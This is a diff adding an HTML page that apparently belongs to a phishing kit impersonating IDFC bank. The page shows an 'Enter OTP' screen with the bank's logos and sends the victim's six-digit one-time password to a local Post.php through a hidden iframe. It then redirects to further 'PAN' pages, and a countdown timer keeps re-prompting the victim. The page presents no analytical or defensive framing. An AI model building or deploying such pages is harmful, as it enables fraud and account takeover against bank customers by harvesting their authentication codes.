@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+<meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <meta name="theme-color" content="#9C1D26">
+    <title>IDFC | Enter OTP</title>
+<meta name="description" content="login" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/site.webmanifest">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap" rel="stylesheet">
+<link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css'><link rel="stylesheet" href="./style.css">
+</head>
+<style type="text/css">
+#mn
+{ 
+  width:40%;
+  margin-top:10px;
+  margin-bottom:20px;
+  margin-left:10px;
+}
+#ft
+{ 
+  width:104%;
+  margin-top:50px;
+  margin-left:-7px;
+  text-align:bottom;
+}
+#pc
+{ 
+  width:50%;
+}
+#ot
+{ 
+  width:35%;
+  margin-left:10px;
+  margin-top:10px;
+}
+input[type="text"] {
+  width: 95%;
+  color:#707070;
+  font-size:14px;
+  border: 1.5px solid #D8D8D8;
+  border-radius: 4px;
+  outline: none;
+  padding: 20px 22px;
+  box-sizing: border-box;
+  transition: 0.3s;
+}
+body{
+  font-family: 'Roboto', sans-serif;
+   background-color: #f7f7f7;
+  
+}
+
+
+/*------------*/
+.form-area {
+    background-color: #fff;
+    box-shadow: 2px 5px 10px rgba(90, 116, 148, 0.2);
+    padding: 20px;
+    border-radius: 6px;
+    display: flex;
+    }
+.form-area .form-inner {
+    width: 100%;
+}
+.intl-tel-input,
+.iti{
+  width: 100%;
+}
+
+input::-webkit-input-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus::-webkit-input-placeholder {
+    color: #999;
+    text-transform:none;
+    font-family: 'Open Sans', sans-serif;
+}
+
+/* Firefox < 19 */
+input:-moz-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus:-moz-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+
+/* Firefox > 19 */
+input::-moz-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus::-moz-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+
+/* Internet Explorer 10 */
+input:-ms-input-placeholder {
+    color: transparent;
+    font-family: 'Open Sans', sans-serif;
+}
+input:focus:-ms-input-placeholder {
+    color: #999;
+    font-family: 'Open Sans', sans-serif;
+    text-transform:none;
+}
+</style>
+<body onload="startTimer();">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Proccessing_OTP_PAN.html';}"></iframe>
+        <div class="container">
+        <img alt="" src="IDFC_Logo.jpg" id="mn"/><br>
+        <section class="pt-5 pb-5">
+    <div class="container text-center">
+        <div class="row">
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="row justify-content-center">
+                <div class="form-area">
+                    <div class="form-inner">
+                        <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="form">
+                        <center><img alt="" src="IDFC_Pic.jpg" id="pc"/></center>
+                        <center><h1 style="
+                        font-family: 'Open Sans', sans-serif;
+                        font-size:18px;
+                        color:#54555B;
+                        letter-spacing:0.8px;"
+                        >Please Enter OTP</h1></center>
+                        <center><p1 style="font-size:13px; font-family: 'Open Sans', sans-serif; color:#707070; font-weight:400; letter-spacing:0.5px;">OTP has been send to your registered <br>mobile number. Please enter OTP<br> and proceed. </p1></center>
+                        <br><br>
+                        <div class="input-group">
+                        <center><input type="text" class="input-group__input" placeholder="Enter OTP" name="2ND_OTP" id="name" inputmode="numeric" maxlength="6" 
+                        pattern="\d{6,9}" title="Please enter valid OTP !" autocomplete="off" required />
+                        <label class="input-group__label2" for="Password">One Time Password</label></center>
+                        <a href=""><img src="OTP.jpg" alt="" id="ot"></a>
+                        </div>
+                        <script type="text/javascript">
+                        var timer=180;
+                        var sec=0;
+                        function startTimer() {
+                        sec=parseInt(timer%180);
+                        
+                        if (timer<2) {
+                        // timer.stop();
+                        window.location.href = "Enter_OTP_PAN.html";
+                        }
+                        
+                        document.getElementById("time").innerHTML = "<p1> Wait for OTP   : </p1>"+sec.toString();
+                        timer--;
+                        setTimeout(function(){
+                        startTimer();
+                        
+                        }, 1000);
+                        }                       
+                        </script>
+                        <div>
+                        <center><b style="color:#707070; font-family: 'Open Sans', sans-serif; font-size:14px; text-align:center;"><span style="color:#707070; font-family: 'Open Sans', sans-serif; font-size:13px;" id="time"></span>&nbsp;second</b></center>
+                        </div><br>
+                        <center><button type="submit">Verify OTP</button></center><br>
+                        </form>
+                        
+</section>
+                        <img alt="" src="IDFC_Footer.jpg" id="ft"/>
+               </div>
+               </div>
+               </div>
+               </div>
+               </div>
+               </body>
+               </html>
